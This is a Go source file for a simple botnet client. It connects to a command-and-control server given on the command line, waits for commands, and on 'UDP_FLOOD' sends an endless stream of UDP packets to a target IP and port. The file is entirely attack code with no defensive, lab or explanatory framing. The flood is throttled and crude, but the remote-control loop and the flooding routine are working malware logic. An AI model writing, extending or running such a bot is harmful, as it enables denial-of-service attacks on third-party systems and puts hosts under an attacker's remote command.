package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const (
	c2Address = "localhost:8080" // Predefined IP address and port for the C2 server
	botPort   = "8888"           // Predefined port for the bot to listen on
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run bot.go <C2_ADDRESS>")
		return
	}

	c2Address := os.Args[1]

	conn, err := net.Dial("tcp", c2Address)
	if err != nil {
		fmt.Println("Error connecting to C2:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Bot connected to C2:", c2Address)

	for {
		// Read command from C2
		commandBuf := make([]byte, 1024)
		n, err := conn.Read(commandBuf)
		if err != nil {
			fmt.Println("Error reading command from C2:", err)
			return
		}

		command := string(commandBuf[:n])
		fmt.Println("Received command from C2:", command)

		// Parse the command
		commandParts := strings.Fields(command)
		if len(commandParts) == 0 {
			continue
		}

		switch commandParts[0] {
		case "UDP_FLOOD":
			if len(commandParts) != 3 {
				fmt.Println("Invalid UDP_FLOOD command format")
				continue
			}

			// Extract target IP address and port from the command
			targetIP := commandParts[1]
			targetPort := commandParts[2]

			// Perform the UDP flood
			udpFlood(targetIP, targetPort)
		default:
			fmt.Println("Unknown command:", commandParts[0])
		}
	}
}

func udpFlood(targetIP, targetPort string) {
	udpAddr, err := net.ResolveUDPAddr("udp", targetIP+":"+targetPort)
	if err != nil {
		fmt.Println("Error resolving UDP address:", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		fmt.Println("Error dialing UDP:", err)
		return
	}
	defer conn.Close()

	data := []byte("UDP Flood Message")
	for {
		_, err := conn.Write(data)
		if err != nil {
			fmt.Println("Error sending UDP packet:", err)
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
}
